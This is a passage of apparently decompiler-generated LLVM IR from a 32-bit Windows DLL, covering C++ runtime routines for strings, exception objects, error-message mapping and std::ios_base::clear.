  ret i32 %20, !insn.addr !332

dec_label_pc_10001953:                            ; preds = %dec_label_pc_10001944, %dec_label_pc_10001920
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %21 = and i32 %eax.0.reload, -256, !insn.addr !333
  ret i32 %21, !insn.addr !334
}

define i32 @function_10001960(i32 %arg1, i32 %arg2) {
dec_label_pc_10001960:
  %eax.0.reg2mem = alloca i32, !insn.addr !335
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 4, !insn.addr !336
  %2 = inttoptr i32 %1 to i32*, !insn.addr !336
  %3 = load i32, i32* %2, align 4, !insn.addr !336
  %4 = add i32 %arg1, 4, !insn.addr !337
  %5 = inttoptr i32 %4 to i32*, !insn.addr !337
  %6 = load i32, i32* %5, align 4, !insn.addr !337
  %7 = add i32 %6, 4, !insn.addr !338
  %8 = inttoptr i32 %7 to i32*, !insn.addr !338
  %9 = load i32, i32* %8, align 4, !insn.addr !338
  %10 = icmp eq i32 %3, %9, !insn.addr !338
  %11 = icmp eq i1 %10, false, !insn.addr !339
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !339
  br i1 %11, label %dec_label_pc_10001980, label %dec_label_pc_10001972, !insn.addr !339

dec_label_pc_10001972:                            ; preds = %dec_label_pc_10001960
  %12 = inttoptr i32 %arg1 to i32*, !insn.addr !340
  %13 = load i32, i32* %12, align 4, !insn.addr !340
  %14 = icmp eq i32 %13, %arg2, !insn.addr !341
  %15 = icmp eq i1 %14, false, !insn.addr !342
  store i32 %13, i32* %eax.0.reg2mem, !insn.addr !342
  br i1 %15, label %dec_label_pc_10001980, label %dec_label_pc_10001979, !insn.addr !342

dec_label_pc_10001979:                            ; preds = %dec_label_pc_10001972
  %16 = and i32 %13, -256, !insn.addr !343
  %17 = or i32 %16, 1, !insn.addr !343
  ret i32 %17, !insn.addr !344

dec_label_pc_10001980:                            ; preds = %dec_label_pc_10001972, %dec_label_pc_10001960
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %18 = and i32 %eax.0.reload, -256, !insn.addr !345
  ret i32 %18, !insn.addr !346
}

define i32 @function_10001990(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10001990:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @function_10004a70(i32 %0), !insn.addr !347
  %2 = add i32 %arg1, 4, !insn.addr !348
  %3 = inttoptr i32 %2 to i32*, !insn.addr !348
  store i32 %1, i32* %3, align 4, !insn.addr !348
  %4 = inttoptr i32 %arg1 to i32*, !insn.addr !349
  store i32 %arg2, i32* %4, align 4, !insn.addr !349
  ret i32 %arg1, !insn.addr !350
}

define i32 @function_100019b0(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_100019b0:
  %ecx.0.reg2mem = alloca i32, !insn.addr !351
  %eax.1.reg2mem = alloca i32, !insn.addr !351
  %eax.0.reg2mem = alloca i32, !insn.addr !351
  %esp.0.reg2mem = alloca i32, !insn.addr !351
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-60 = alloca i8, align 1
  %stack_var_-84 = alloca i8*, align 4
  %1 = call i64 @__decompiler_undefined_function_7()
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %2 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !352
  %3 = call i32 @__readfsdword(i32 0), !insn.addr !353
  store i32 %3, i32* %stack_var_-28, align 4, !insn.addr !354
  %4 = load i32, i32* @global_var_1003d084, align 4, !insn.addr !355
  %5 = xor i32 %4, %2, !insn.addr !356
  store i32 %5, i32* %stack_var_-76, align 4, !insn.addr !357
  %6 = ptrtoint i32* %stack_var_-76 to i32, !insn.addr !357
  %7 = ptrtoint i32* %stack_var_-28 to i32, !insn.addr !358
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !359
  %8 = trunc i64 %1 to i32, !insn.addr !360
  %9 = icmp eq i32 %8, 0, !insn.addr !360
  store i32 %6, i32* %esp.0.reg2mem, !insn.addr !361
  br i1 %9, label %dec_label_pc_10001a13, label %dec_label_pc_10001a04, !insn.addr !361

dec_label_pc_10001a04:                            ; preds = %dec_label_pc_100019b0
  store i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10038c08, i32 0, i32 0), i8** %stack_var_-84, align 4, !insn.addr !362
  %10 = ptrtoint i8** %stack_var_-84 to i32, !insn.addr !362
  %11 = call i32 @function_100043d0(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10038c08, i32 0, i32 0), i32 2), !insn.addr !363
  store i32 %10, i32* %esp.0.reg2mem, !insn.addr !363
  br label %dec_label_pc_10001a13, !insn.addr !363

dec_label_pc_10001a13:                            ; preds = %dec_label_pc_10001a04, %dec_label_pc_100019b0
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %12 = add i32 %esp.0.reload, -4, !insn.addr !364
  %13 = inttoptr i32 %12 to i32*, !insn.addr !364
  %14 = ptrtoint i8* %stack_var_-60 to i32, !insn.addr !364
  store i32 %14, i32* %13, align 4, !insn.addr !364
  %15 = call i32 @function_100018d0(i32 ptrtoint (i32* @4 to i32)), !insn.addr !365
  %16 = add i32 %esp.0.reload, -8, !insn.addr !366
  %17 = inttoptr i32 %16 to i32*, !insn.addr !366
  store i32 -1, i32* %17, align 4, !insn.addr !366
  %18 = add i32 %esp.0.reload, -12, !insn.addr !367
  %19 = inttoptr i32 %18 to i32*, !insn.addr !367
  store i32 0, i32* %19, align 4, !insn.addr !367
  %20 = add i32 %esp.0.reload, -16, !insn.addr !368
  %21 = inttoptr i32 %20 to i32*, !insn.addr !368
  store i32 %15, i32* %21, align 4, !insn.addr !368
  %22 = call i32 @function_100044c0(i8 1, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32)), !insn.addr !369
  %23 = icmp ult i32 %0, 16, !insn.addr !370
  br i1 %23, label %dec_label_pc_10001a7a, label %dec_label_pc_10001a38, !insn.addr !371

dec_label_pc_10001a38:                            ; preds = %dec_label_pc_10001a13
  %24 = load i8, i8* %stack_var_-60, align 1, !insn.addr !372
  %25 = sext i8 %24 to i32, !insn.addr !372
  %26 = add i32 %0, 1, !insn.addr !373
  %27 = icmp ult i32 %26, 4096, !insn.addr !374
  store i32 %25, i32* %ecx.0.reg2mem, !insn.addr !375
  br i1 %27, label %dec_label_pc_10001a71, label %dec_label_pc_10001a43, !insn.addr !375

dec_label_pc_10001a43:                            ; preds = %dec_label_pc_10001a38
  %28 = and i32 %25, 31
  %29 = icmp eq i32 %28, 0, !insn.addr !376
  br i1 %29, label %dec_label_pc_10001a4d, label %dec_label_pc_10001a48, !insn.addr !377

dec_label_pc_10001a48:                            ; preds = %dec_label_pc_10001a43
  %30 = call i32 @__invalid_parameter_noinfo_noreturn(), !insn.addr !378
  br label %dec_label_pc_10001a4d, !insn.addr !378

dec_label_pc_10001a4d:                            ; preds = %dec_label_pc_10001a48, %dec_label_pc_10001a43
  %31 = add nsw i32 %25, -4, !insn.addr !379
  %32 = inttoptr i32 %31 to i32*, !insn.addr !379
  %33 = load i32, i32* %32, align 4, !insn.addr !379
  %34 = icmp ult i32 %33, %25, !insn.addr !380
  store i32 %33, i32* %eax.0.reg2mem, !insn.addr !381
  br i1 %34, label %dec_label_pc_10001a59, label %dec_label_pc_10001a54, !insn.addr !381

dec_label_pc_10001a54:                            ; preds = %dec_label_pc_10001a4d
  %35 = call i32 @__invalid_parameter_noinfo_noreturn(), !insn.addr !382
  store i32 %35, i32* %eax.0.reg2mem, !insn.addr !382
  br label %dec_label_pc_10001a59, !insn.addr !382

dec_label_pc_10001a59:                            ; preds = %dec_label_pc_10001a54, %dec_label_pc_10001a4d
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %36 = sub i32 %25, %eax.0.reload, !insn.addr !383
  %37 = icmp ult i32 %36, 4, !insn.addr !384
  %38 = icmp eq i1 %37, false, !insn.addr !385
  store i32 %eax.0.reload, i32* %eax.1.reg2mem, !insn.addr !385
  br i1 %38, label %dec_label_pc_10001a65, label %dec_label_pc_10001a60, !insn.addr !385

dec_label_pc_10001a60:                            ; preds = %dec_label_pc_10001a59
  %39 = call i32 @__invalid_parameter_noinfo_noreturn(), !insn.addr !386
  store i32 %39, i32* %eax.1.reg2mem, !insn.addr !386
  br label %dec_label_pc_10001a65, !insn.addr !386

dec_label_pc_10001a65:                            ; preds = %dec_label_pc_10001a60, %dec_label_pc_10001a59
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  %40 = icmp ult i32 %36, 36
  store i32 %eax.1.reload, i32* %ecx.0.reg2mem, !insn.addr !387
  br i1 %40, label %dec_label_pc_10001a71, label %dec_label_pc_10001a6a, !insn.addr !387

dec_label_pc_10001a6a:                            ; preds = %dec_label_pc_10001a65
  %41 = call i32 @__invalid_parameter_noinfo_noreturn(), !insn.addr !388
  store i32 %41, i32* %ecx.0.reg2mem, !insn.addr !388
  br label %dec_label_pc_10001a71, !insn.addr !388

dec_label_pc_10001a71:                            ; preds = %dec_label_pc_10001a65, %dec_label_pc_10001a6a, %dec_label_pc_10001a38
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %42 = add i32 %esp.0.reload, -20, !insn.addr !389
  %43 = inttoptr i32 %42 to i32*, !insn.addr !389
  store i32 %ecx.0.reload, i32* %43, align 4, !insn.addr !389
  call void @function_1000f3cd(i32* nonnull @4), !insn.addr !390
  br label %dec_label_pc_10001a7a, !insn.addr !391

dec_label_pc_10001a7a:                            ; preds = %dec_label_pc_10001a71, %dec_label_pc_10001a13
  %44 = call i128 @__asm_movups.36(i128 undef), !insn.addr !392
  %45 = add i32 %arg2, 16, !insn.addr !393
  %46 = inttoptr i32 %45 to i32*, !insn.addr !393
  store i32 0, i32* %46, align 4, !insn.addr !393
  %47 = add i32 %arg2, 20, !insn.addr !394
  %48 = inttoptr i32 %47 to i32*, !insn.addr !394
  store i32 0, i32* %48, align 4, !insn.addr !394
  %49 = inttoptr i32 %arg2 to i128*, !insn.addr !395
  %50 = load i128, i128* %49, align 4, !insn.addr !395
  call void @__asm_movups(i128 %50, i128 %44), !insn.addr !395
  %51 = mul i64 %1, 4294967296
  %52 = sdiv i64 %51, 4294967296, !insn.addr !396
  %53 = call i128 @__asm_movq(i64 %52), !insn.addr !396
  %54 = inttoptr i32 %45 to i64*, !insn.addr !397
  %55 = load i64, i64* %54, align 4, !insn.addr !397
  call void @__asm_movq.32(i64 %55, i128 %53), !insn.addr !397
  %56 = load i32, i32* %stack_var_-28, align 4, !insn.addr !398
  call void @__writefsdword(i32 0, i32 %56), !insn.addr !399
  %57 = call i32 @"@__security_check_cookie@4"(), !insn.addr !400
  ret i32 %57, !insn.addr !401
}

define i32 @function_10001ac0(i32 %arg1, i32 %arg2, i8* %arg3) local_unnamed_addr {
dec_label_pc_10001ac0:
  %ecx.0.reg2mem = alloca i32, !insn.addr !402
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = call i128 @__decompiler_undefined_function_3()
  %3 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-48 = alloca i8, align 1
  %4 = trunc i32 %0 to i8, !insn.addr !403
  store i8 %4, i8* %stack_var_-48, align 1, !insn.addr !403
  %5 = ptrtoint i8* %arg3 to i32, !insn.addr !404
  %6 = call i32 @function_10004750(i32 %5, i32 0, i32 -1, i8 0), !insn.addr !404
  %7 = bitcast i8* %stack_var_-48 to i32*, !insn.addr !405
  %8 = call i32 @function_100019b0(i32* nonnull %7, i32 %arg1, i32 %arg2), !insn.addr !405
  %9 = add i32 %1, 4, !insn.addr !406
  %10 = inttoptr i32 %1 to i32*, !insn.addr !407
  store i32 ptrtoint (%vtable_1002c3b4_type* @global_var_1002c3b4 to i32), i32* %10, align 4, !insn.addr !407
  %11 = call i128 @__asm_xorps(i128 %2, i128 %2), !insn.addr !408
  %12 = inttoptr i32 %9 to i64*, !insn.addr !409
  %13 = load i64, i64* %12, align 4, !insn.addr !409
  call void @__asm_movq.32(i64 %13, i128 %11), !insn.addr !409
  %14 = call i32 @___std_exception_copy(), !insn.addr !410
  store i32 ptrtoint (i32* @global_var_1002c3c0 to i32), i32* %10, align 4, !insn.addr !411
  %15 = icmp ult i32 %3, 16, !insn.addr !412
  br i1 %15, label %dec_label_pc_10001b80, label %dec_label_pc_10001b51, !insn.addr !413

dec_label_pc_10001b51:                            ; preds = %dec_label_pc_10001ac0
  %16 = load i8, i8* %stack_var_-48, align 1, !insn.addr !414
  %17 = sext i8 %16 to i32, !insn.addr !414
  %18 = add i32 %3, 1, !insn.addr !415
  %19 = icmp ult i32 %18, 4096, !insn.addr !416
  store i32 %17, i32* %ecx.0.reg2mem, !insn.addr !417
  br i1 %19, label %dec_label_pc_10001b77, label %dec_label_pc_10001b5d, !insn.addr !417

dec_label_pc_10001b5d:                            ; preds = %dec_label_pc_10001b51
  %20 = and i32 %17, 31
  %21 = icmp eq i32 %20, 0, !insn.addr !418
  %22 = icmp eq i1 %21, false, !insn.addr !419
  br i1 %22, label %dec_label_pc_10001ba6, label %dec_label_pc_10001b62, !insn.addr !419

dec_label_pc_10001b62:                            ; preds = %dec_label_pc_10001b5d
  %23 = add nsw i32 %17, -4, !insn.addr !420
  %24 = inttoptr i32 %23 to i32*, !insn.addr !420
  %25 = load i32, i32* %24, align 4, !insn.addr !420
  %26 = icmp ult i32 %25, %17, !insn.addr !421
  %27 = icmp eq i1 %26, false, !insn.addr !422
  br i1 %27, label %dec_label_pc_10001bab, label %dec_label_pc_10001b69, !insn.addr !422

dec_label_pc_10001b69:                            ; preds = %dec_label_pc_10001b62
  %28 = sub i32 %17, %25, !insn.addr !423
  %29 = icmp ult i32 %28, 4, !insn.addr !424
  br i1 %29, label %dec_label_pc_10001bb0, label %dec_label_pc_10001b70, !insn.addr !425

dec_label_pc_10001b70:                            ; preds = %dec_label_pc_10001b69
  %30 = icmp ult i32 %28, 36
  store i32 %25, i32* %ecx.0.reg2mem, !insn.addr !426
  br i1 %30, label %dec_label_pc_10001b77, label %dec_label_pc_10001bb5, !insn.addr !426

dec_label_pc_10001b77:                            ; preds = %dec_label_pc_10001b70, %dec_label_pc_10001b51
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %31 = inttoptr i32 %ecx.0.reload to i32*, !insn.addr !427
  call void @function_1000f3cd(i32* %31), !insn.addr !427
  br label %dec_label_pc_10001b80, !insn.addr !428

dec_label_pc_10001b80:                            ; preds = %dec_label_pc_10001b77, %dec_label_pc_10001ac0
  %32 = add i32 %1, 12, !insn.addr !429
  %33 = inttoptr i32 %32 to i32*, !insn.addr !429
  store i32 %arg1, i32* %33, align 4, !insn.addr !429
  %34 = add i32 %1, 16, !insn.addr !430
  %35 = inttoptr i32 %34 to i32*, !insn.addr !430
  store i32 %arg2, i32* %35, align 4, !insn.addr !430
  store i32 ptrtoint (%vtable_1002c434_type* @global_var_1002c434 to i32), i32* %10, align 4, !insn.addr !431
  %36 = call i32 @"@__security_check_cookie@4"(), !insn.addr !432
  ret i32 %36, !insn.addr !433

dec_label_pc_10001ba6:                            ; preds = %dec_label_pc_10001b5d
  %37 = call i32 @__invalid_parameter_noinfo_noreturn(), !insn.addr !434
  br label %dec_label_pc_10001bab, !insn.addr !434

dec_label_pc_10001bab:                            ; preds = %dec_label_pc_10001ba6, %dec_label_pc_10001b62
  %38 = call i32 @__invalid_parameter_noinfo_noreturn(), !insn.addr !435
  br label %dec_label_pc_10001bb0, !insn.addr !435

dec_label_pc_10001bb0:                            ; preds = %dec_label_pc_10001bab, %dec_label_pc_10001b69
  %39 = call i32 @__invalid_parameter_noinfo_noreturn(), !insn.addr !436
  br label %dec_label_pc_10001bb5, !insn.addr !436

dec_label_pc_10001bb5:                            ; preds = %dec_label_pc_10001b70, %dec_label_pc_10001bb0
  %40 = call i32 @__invalid_parameter_noinfo_noreturn(), !insn.addr !437
  %41 = call i32 @__asm_int3(), !insn.addr !438
  %42 = call i32 @__asm_int3(), !insn.addr !439
  %43 = call i32 @__asm_int3(), !insn.addr !440
  %44 = call i32 @__asm_int3(), !insn.addr !441
  %45 = call i32 @__asm_int3(), !insn.addr !442
  %46 = call i32 @__asm_int3(), !insn.addr !443
  ret i32 %46, !insn.addr !443
}

define i32 @function_10001bc0(i8 %arg1) {
dec_label_pc_10001bc0:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = call i32 @__decompiler_undefined_function_1()
  %3 = add i32 %2, 4, !insn.addr !444
  %4 = inttoptr i32 %2 to i32*, !insn.addr !445
  store i32 ptrtoint (%vtable_1002c3b4_type* @global_var_1002c3b4 to i32), i32* %4, align 4, !insn.addr !445
  %5 = call i32 @___std_exception_destroy(i32 %3, i32 %0, i32 %1), !insn.addr !446
  %6 = and i8 %arg1, 1, !insn.addr !447
  %7 = icmp eq i8 %6, 0, !insn.addr !447
  br i1 %7, label %dec_label_pc_10001be9, label %dec_label_pc_10001bde, !insn.addr !448

dec_label_pc_10001bde:                            ; preds = %dec_label_pc_10001bc0
  call void @"??3@YAXPAXI@Z"(i32* %4, i32 ptrtoint (i32* @4 to i32)), !insn.addr !449
  br label %dec_label_pc_10001be9, !insn.addr !450

dec_label_pc_10001be9:                            ; preds = %dec_label_pc_10001bde, %dec_label_pc_10001bc0
  ret i32 %2, !insn.addr !451
}

define i32 @function_10001bf0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_10001bf0:
  %ecx.0.reg2mem = alloca i32, !insn.addr !452
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-48 = alloca i8, align 1
  %stack_var_-16 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !453
  store i32 %1, i32* %stack_var_-16, align 4, !insn.addr !454
  %2 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !455
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !456
  store i8 0, i8* %stack_var_-48, align 1, !insn.addr !457
  store i32 %arg3, i32* %ecx.0.reg2mem, !insn.addr !458
  br label %dec_label_pc_10001c40, !insn.addr !458

dec_label_pc_10001c40:                            ; preds = %dec_label_pc_10001c40, %dec_label_pc_10001bf0
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %3 = inttoptr i32 %ecx.0.reload to i8*, !insn.addr !459
  %4 = load i8, i8* %3, align 1, !insn.addr !459
  %5 = add i32 %ecx.0.reload, 1, !insn.addr !460
  %6 = icmp eq i8 %4, 0, !insn.addr !461
  %7 = icmp eq i1 %6, false, !insn.addr !462
  store i32 %5, i32* %ecx.0.reg2mem, !insn.addr !462
  br i1 %7, label %dec_label_pc_10001c40, label %dec_label_pc_10001c47, !insn.addr !462

dec_label_pc_10001c47:                            ; preds = %dec_label_pc_10001c40
  %8 = sub i32 %ecx.0.reload, %arg3, !insn.addr !463
  %9 = call i32 @function_10004300(i32 %arg3, i32 %8), !insn.addr !464
  %10 = call i32 @function_10001ac0(i32 %arg1, i32 %arg2, i8* nonnull %stack_var_-48), !insn.addr !465
  %11 = inttoptr i32 %0 to i32*, !insn.addr !466
  store i32 ptrtoint (i32* @global_var_1002c440 to i32), i32* %11, align 4, !insn.addr !466
  %12 = load i32, i32* %stack_var_-16, align 4, !insn.addr !467
  call void @__writefsdword(i32 0, i32 %12), !insn.addr !468
  %13 = call i32 @"@__security_check_cookie@4"(), !insn.addr !469
  ret i32 %13, !insn.addr !470
}

define i32 @function_10001ce0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_10001ce0:
  %ecx.0.reg2mem = alloca i32, !insn.addr !471
  %0 = call i32 @"?_Syserror_map@std@@YAPBDH@Z"(i32 %arg2), !insn.addr !472
  %1 = add i32 %arg1, 16, !insn.addr !473
  %2 = inttoptr i32 %1 to i32*, !insn.addr !473
  store i32 0, i32* %2, align 4, !insn.addr !473
  %3 = add i32 %arg1, 20, !insn.addr !474
  %4 = inttoptr i32 %3 to i32*, !insn.addr !474
  store i32 15, i32* %4, align 4, !insn.addr !474
  %5 = inttoptr i32 %arg1 to i8*, !insn.addr !475
  store i8 0, i8* %5, align 1, !insn.addr !475
  store i32 %0, i32* %ecx.0.reg2mem, !insn.addr !475
  br label %dec_label_pc_10001d13, !insn.addr !475

dec_label_pc_10001d13:                            ; preds = %dec_label_pc_10001d13, %dec_label_pc_10001ce0
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %6 = inttoptr i32 %ecx.0.reload to i8*, !insn.addr !476
  %7 = load i8, i8* %6, align 1, !insn.addr !476
  %8 = add i32 %ecx.0.reload, 1, !insn.addr !477
  %9 = icmp eq i8 %7, 0, !insn.addr !478
  %10 = icmp eq i1 %9, false, !insn.addr !479
  store i32 %8, i32* %ecx.0.reg2mem, !insn.addr !479
  br i1 %10, label %dec_label_pc_10001d13, label %dec_label_pc_10001d1a, !insn.addr !479

dec_label_pc_10001d1a:                            ; preds = %dec_label_pc_10001d13
  %11 = sub i32 %ecx.0.reload, %0, !insn.addr !480
  %12 = call i32 @function_10004300(i32 %0, i32 %11), !insn.addr !481
  ret i32 %arg1, !insn.addr !482
}

define i32 @function_10001d30() {
dec_label_pc_10001d30:
  ret i32 ptrtoint ([9 x i8]* @global_var_10038c0c to i32), !insn.addr !483
}

define i32 @function_10001d40(i32 %arg1, i32 %arg2) {
dec_label_pc_10001d40:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = icmp eq i32 %arg2, 1, !insn.addr !484
  %3 = icmp eq i1 %2, false, !insn.addr !485
  br i1 %3, label %dec_label_pc_10001d7f, label %dec_label_pc_10001d57, !insn.addr !485

dec_label_pc_10001d57:                            ; preds = %dec_label_pc_10001d40
  %4 = add i32 %arg1, 16, !insn.addr !486
  %5 = inttoptr i32 %4 to i32*, !insn.addr !486
  store i32 0, i32* %5, align 4, !insn.addr !486
  %6 = add i32 %arg1, 20, !insn.addr !487
  %7 = inttoptr i32 %6 to i32*, !insn.addr !487
  store i32 15, i32* %7, align 4, !insn.addr !487
  %8 = inttoptr i32 %arg1 to i8*, !insn.addr !488
  store i8 0, i8* %8, align 1, !insn.addr !488
  %9 = call i32 @function_10004300(i32 ptrtoint ([22 x i8]* @global_var_10038c18 to i32), i32 21), !insn.addr !489
  ret i32 %arg1, !insn.addr !490

dec_label_pc_10001d7f:                            ; preds = %dec_label_pc_10001d40
  %10 = call i32 @function_10001ce0(i32 %arg1, i32 %arg2, i32 %0, i32 0, i32 %1), !insn.addr !491
  ret i32 %arg1, !insn.addr !492
}

define i32 @function_10001d90(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10001d90:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = call i32 @__decompiler_undefined_function_1()
  %3 = add i32 %arg2, 4, !insn.addr !493
  %4 = inttoptr i32 %3 to i32*, !insn.addr !493
  %5 = load i32, i32* %4, align 4, !insn.addr !493
  %6 = inttoptr i32 %arg2 to i32*, !insn.addr !494
  %7 = load i32, i32* %6, align 4, !insn.addr !494
  %8 = ptrtoint i8* %arg1 to i32, !insn.addr !495
  %9 = call i32 @function_10001bf0(i32 %7, i32 %5, i32 %8, i32 %0, i32 %2, i32 %1), !insn.addr !495
  %10 = inttoptr i32 %2 to i32*, !insn.addr !496
  store i32 ptrtoint (i32* @global_var_1002c468 to i32), i32* %10, align 4, !insn.addr !496
  ret i32 %2, !insn.addr !497
}

define void @"?clear@ios_base@std@@QAEXH_N@Z"(i32* %result, i32 %arg2, i1 %arg3) local_unnamed_addr {
dec_label_pc_10001dc0:
  %esp.1.reg2mem = alloca i32, !insn.addr !498
  %.pre-phi.reg2mem = alloca i32*, !insn.addr !498
  %esp.0.reg2mem = alloca i32, !insn.addr !498
  %0 = ptrtoint i32* %result to i32
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i8*, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %1 = and i32 %arg2, 23, !insn.addr !499
  %2 = add i32 %0, 12, !insn.addr !500
  %3 = inttoptr i32 %2 to i32*, !insn.addr !500
  store i32 %1, i32* %3, align 4, !insn.addr !500
  %4 = add i32 %0, 16, !insn.addr !501
  %5 = inttoptr i32 %4 to i32*, !insn.addr !501
  %6 = load i32, i32* %5, align 4, !insn.addr !501
  %7 = and i32 %6, %1, !insn.addr !502
  %8 = icmp eq i32 %7, 0, !insn.addr !502
  br i1 %8, label %dec_label_pc_10001df2, label %dec_label_pc_10001dd9, !insn.addr !503

dec_label_pc_10001dd9:                            ; preds = %dec_label_pc_10001dc0
  %9 = icmp eq i1 %arg3, false, !insn.addr !504
  %10 = icmp eq i1 %9, false, !insn.addr !505
  br i1 %10, label %dec_label_pc_10001df8, label %dec_label_pc_10001ddf, !insn.addr !505

dec_label_pc_10001ddf:                            ; preds = %dec_label_pc_10001dd9
  %11 = bitcast i32* %stack_var_-36 to i8*
  store i8* %11, i8** %stack_var_-48, align 4, !insn.addr !506
  %12 = and i32 %7, 4
  %13 = icmp eq i32 %12, 0, !insn.addr !507
  %14 = icmp eq i1 %13, false, !insn.addr !508
  br i1 %14, label %dec_label_pc_10001e01, label %dec_label_pc_10001deb, !insn.addr !508

dec_label_pc_10001deb:                            ; preds = %dec_label_pc_10001ddf
  %15 = ptrtoint i8** %stack_var_-48 to i32, !insn.addr !506
  %16 = and i32 %7, 2
  %17 = icmp eq i32 %16, 0, !insn.addr !509
  %18 = icmp eq i1 %17, false, !insn.addr !510
  store i32 %15, i32* %esp.0.reg2mem, !insn.addr !510
  br i1 %18, label %dec_label_pc_10001e27, label %dec_label_pc_10001deb.dec_label_pc_10001e4d_crit_edge, !insn.addr !510

dec_label_pc_10001deb.dec_label_pc_10001e4d_crit_edge: ; preds = %dec_label_pc_10001deb
  %.pre = bitcast i8** %stack_var_-48 to i32*, !insn.addr !511
  store i32* %.pre, i32** %.pre-phi.reg2mem
  store i32 %15, i32* %esp.1.reg2mem
  br label %dec_label_pc_10001e4d

dec_label_pc_10001df2:                            ; preds = %dec_label_pc_10001dc0
  ret void, !insn.addr !512

dec_label_pc_10001df8:                            ; preds = %dec_label_pc_10001dd9
  store i8* null, i8** %stack_var_-48, align 4, !insn.addr !513
  %19 = call i32 @"__CxxThrowException@8"(), !insn.addr !514
  br label %dec_label_pc_10001e01, !insn.addr !514

dec_label_pc_10001e01:                            ; preds = %dec_label_pc_10001df8, %dec_label_pc_10001ddf
  %20 = call i32 @function_10001990(i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32)), !insn.addr !515
  store i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_10038c30, i32 0, i32 0), i8** %stack_var_-48, align 4, !insn.addr !516
  %21 = call i32 @function_10001d90(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_10038c30, i32 0, i32 0), i32 %20), !insn.addr !517
  %22 = ptrtoint i32* %stack_var_-36 to i32, !insn.addr !518
  store i32 %22, i32* %stack_var_-56, align 4, !insn.addr !518
  %23 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !518
  %24 = call i32 @"__CxxThrowException@8"(), !insn.addr !519
  store i32 %23, i32* %esp.0.reg2mem, !insn.addr !519
  br label %dec_label_pc_10001e27, !insn.addr !519

dec_label_pc_10001e27:                            ; preds = %dec_label_pc_10001e01, %dec_label_pc_10001deb
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %25 = call i32 @function_10001990(i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32)), !insn.addr !520
  %26 = add i32 %esp.0.reload, 4, !insn.addr !521
  %27 = inttoptr i32 %26 to i32*, !insn.addr !521
  store i32 %25, i32* %27, align 4, !insn.addr !521
  %28 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !522
  store i32 ptrtoint ([22 x i8]* @global_var_10038c48 to i32), i32* %28, align 4, !insn.addr !522
  %29 = call i32 @function_10001d90(i8* bitcast (i32* @4 to i8*), i32 ptrtoint (i32* @4 to i32)), !insn.addr !523
  %30 = add i32 %esp.0.reload, -4, !insn.addr !524
  %31 = inttoptr i32 %30 to i32*, !insn.addr !524
  store i32 ptrtoint (i32* @global_var_1003ada4 to i32), i32* %31, align 4, !insn.addr !524
  %32 = add i32 %esp.0.reload, 12, !insn.addr !525
  %33 = add i32 %esp.0.reload, -8, !insn.addr !526
  %34 = inttoptr i32 %33 to i32*
  store i32 %32, i32* %34, align 4, !insn.addr !526
  %35 = call i32 @"__CxxThrowException@8"(), !insn.addr !527
  store i32* %34, i32** %.pre-phi.reg2mem, !insn.addr !527
  store i32 %33, i32* %esp.1.reg2mem, !insn.addr !527
  br label %dec_label_pc_10001e4d, !insn.addr !527

dec_label_pc_10001e4d:                            ; preds = %dec_label_pc_10001deb.dec_label_pc_10001e4d_crit_edge, %dec_label_pc_10001e27
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %.pre-phi.reload = load i32*, i32** %.pre-phi.reg2mem
  %36 = call i32 @function_10001990(i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32)), !insn.addr !528
  %37 = add i32 %esp.1.reload, 4, !insn.addr !529
  %38 = inttoptr i32 %37 to i32*, !insn.addr !529
  store i32 %36, i32* %38, align 4, !insn.addr !529
  store i32 ptrtoint ([21 x i8]* @global_var_10038c60 to i32), i32* %.pre-phi.reload, align 4, !insn.addr !511
